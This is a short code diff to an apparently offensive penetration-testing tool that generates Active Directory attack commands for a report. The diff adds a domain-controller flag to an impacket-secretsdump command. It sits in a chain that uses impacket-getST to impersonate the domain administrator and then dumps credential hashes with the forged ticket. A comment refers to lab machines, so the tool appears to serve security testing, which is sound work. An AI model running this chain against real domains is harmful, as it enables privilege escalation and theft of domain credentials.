@@ -687,7 +687,11 @@ def run(report, store, ui=None):
                     f"impacket-getST -spn '{first_spn}' -impersonate administrator "
                     f"-dc-ip {_dc_c} '{_dom_c}/{ulc}:{pw}'",
                     f"export KRB5CCNAME=administrator.ccache",
-                    f"impacket-secretsdump -k -no-pass "
+                    # iter-67: -dc-ip anchor here too - the -k -no-pass
+                    # secretsdump still needs KDC discovery for ticket
+                    # validation; without it lab boxes without a working
+                    # DNS SRV lookup fail with "Kerberos SessionError".
+                    f"impacket-secretsdump -k -no-pass -dc-ip {_dc_c} "
                     f"'{_dom_c}/administrator@{_spn_host}'",
                 ], src=best_src, line=best_line))
 
